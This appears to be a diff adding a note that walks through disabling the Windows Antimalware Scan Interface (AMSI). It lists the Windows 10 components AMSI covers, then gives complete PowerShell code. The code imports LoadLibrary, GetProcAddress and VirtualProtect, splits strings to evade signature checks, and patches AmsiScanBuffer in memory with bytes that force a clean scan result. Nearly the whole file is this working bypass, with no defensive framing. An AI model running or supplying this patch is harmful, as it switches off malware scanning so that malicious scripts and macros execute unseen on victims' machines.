@@ -1,0 +1,41 @@
+The AMSI feature is integrated into these components of Windows 10 : 
+
+1. User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
+2. PowerShell (scripts, interactive use, and dynamic code evaluation)
+3. Windows Script Host (wscript.exe and cscript.exe)
+4. JavaScript and VBScript
+5. Office VBA macros
+
+Objective    : Make hooked dll amsi.dll Return AMSI_RESULT_CLEAN for all function call to AmsiScanBuffer
+Strategy     : Patch the AmsiScanBuffer function to always return AMSI_RESULT_CLEAN  
+
+Key Result 1 : import .NET core classes into powershell session (VirtualProtect - Memory Patching , GetProcAddress - receive address of 'AmsiScanBuffer' library, LoadLibrary - Load amsi.dll through add-type 
+
+$Win32 = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+Add-Type $Win32
+
+Key Result 2 : amsi.dll library is loaded 
+$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
+
+Key Result 3 : address of function "AmsiScanBuffer" is located and appropriate permissions are set  
+$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+
+Key Result 4 : through copy function the function is patched to return 'AMSI_RESULT_CLEAN' 
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+
+
+
